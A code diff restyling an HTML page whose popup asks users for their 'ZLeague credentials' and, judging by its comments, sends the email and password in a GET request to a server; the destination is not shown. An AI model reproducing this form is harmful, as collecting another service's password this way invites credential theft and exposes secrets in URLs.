@@ -7,12 +7,31 @@
     <style>
         /* Dark grey background */
         body {
-            background-color: #222;
-            color: #fff;
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-        }
+  font-family: 'Anonymous Pro', monospace;  
+
+  width: 100%;
+  height: 100%;
+
+  background: #000000;
+  --gap: 5em;
+  --line: 1px;
+  --color: rgba(255, 255, 255, 0.2);
+
+  background-image: linear-gradient(
+      -90deg,
+      transparent calc(var(--gap) - var(--line)),
+      var(--color) calc(var(--gap) - var(--line) + 1px),
+      var(--color) var(--gap)
+    ),
+    linear-gradient(
+      0deg,
+      transparent calc(var(--gap) - var(--line)),
+      var(--color) calc(var(--gap) - var(--line) + 1px),
+      var(--color) var(--gap)
+    );
+  background-size: var(--gap) var(--gap);
+  overflow: hidden;
+}
 
         /* Add your zleague styles here */
         .zleague-button {
@@ -65,12 +84,6 @@
             align-items: center;
         }
 
-        .popup-content {
-            background-color: #333;
-            padding: 20px;
-            border-radius: 5px;
-        }
-
         .close {
             position: absolute;
             top: 10px;
@@ -87,15 +100,123 @@
 
     <div class="popup" id="popup">
         <div class="popup-content">
+            <style>
+                .login-box {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                width: 400px;
+                padding: 40px;
+                transform: translate(-50%, -50%);
+                background: rgba(24, 20, 20, 0.987);
+                box-sizing: border-box;
+                box-shadow: 0 15px 25px rgba(0,0,0,.6);
+                border-radius: 10px;
+                }
+
+                .login-box .user-box {
+                position: relative;
+                }
+
+                .login-box .user-box input {
+                width: 100%;
+                padding: 10px 0;
+                font-size: 16px;
+                color: #fff;
+                margin-bottom: 30px;
+                border: none;
+                border-bottom: 1px solid #fff;
+                outline: none;
+                background: transparent;
+                }
+
+                .login-box .user-box label {
+                position: absolute;
+                top: 0;
+                left: 0;
+                padding: 10px 0;
+                font-size: 16px;
+                color: #fff;
+                pointer-events: none;
+                transition: .5s;
+                }
+
+                .login-box .user-box input:focus ~ label,
+                .login-box .user-box input:valid ~ label {
+                top: -20px;
+                left: 0;
+                color: #bdb8b8;
+                font-size: 12px;
+                }
+
+                .login-box form a {
+                position: relative;
+                display: inline-block;
+                padding: 10px 20px;
+                color: #ffffff;
+                font-size: 16px;
+                text-decoration: none;
+                text-transform: uppercase;
+                overflow: hidden;
+                transition: .5s;
+                margin-top: 40px;
+                letter-spacing: 4px
+                }
+
+                .login-box a:hover {
+                background: rgb(209, 209, 209);
+                color: #fff;
+                border-radius: 5px;
+                box-shadow: 0 0 5px rgb(209, 209, 209),
+                            0 0 25px rgb(209, 209, 209),
+                            0 0 50px rgb(209, 209, 209),
+                            0 0 100px rgb(209, 209, 209);
+                cursor: pointer;
+                }
+
+                .login-box a span {
+                position: absolute;
+                display: block;
+                }
+
+                @keyframes btn-anim1 {
+                0% {
+                    left: -100%;
+                }
+
+                50%,100% {
+                    left: 100%;
+                }
+                }
+
+                .login-box a span:nth-child(1) {
+                bottom: 2px;
+                left: -100%;
+                width: 100%;
+                height: 2px;
+                background: linear-gradient(90deg, transparent, rgb(209, 209, 209));
+                animation: btn-anim1 2s linear infinite;
+                }
+            </style>
             <span class="close" onclick="closePopup()">&times;</span>
-            <h2>Please enter your ZLeague credentials</h2>
-            <form id="loginForm">
-                <label for="email">Email:</label><br>
-                <input type="email" id="email" name="email" required><br>
-                <label for="password">Password:</label><br>
-                <input type="password" id="password" name="password" required><br><br>
-                <input type="submit" value="Submit">
-            </form>
+            <div class="login-box">
+ 
+                <form id="">
+                  <div class="user-box">
+                    <input type="text" name="email" id="email" required="true">
+                    <label>Username</label>
+                  </div>
+                  <div class="user-box">
+                    <input type="password" name="password" id="password" required="true">
+                    <label>Password</label>
+                  </div><center>
+                        <a onclick="login()">
+                               LOGIN
+                           <span></span>
+                        </a></center>
+
+                </form>
+              </div>
         </div>
     </div>
 
@@ -129,11 +250,13 @@
         }
 
         // Function to handle form submission
-        document.getElementById('loginForm').addEventListener('submit', async function (e) {
-            e.preventDefault();
+        async function login(){
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-
+            if(!email || !password){
+                alert('Please enter email and password');
+                return;
+            }
             // Save email and password to a cookie
             
             // Send GET request to the server with email and password
@@ -147,8 +270,7 @@
                 closePopup();
                 location.reload();
             }
-            
-        });
+        }
     </script>
 </body>
 </html>
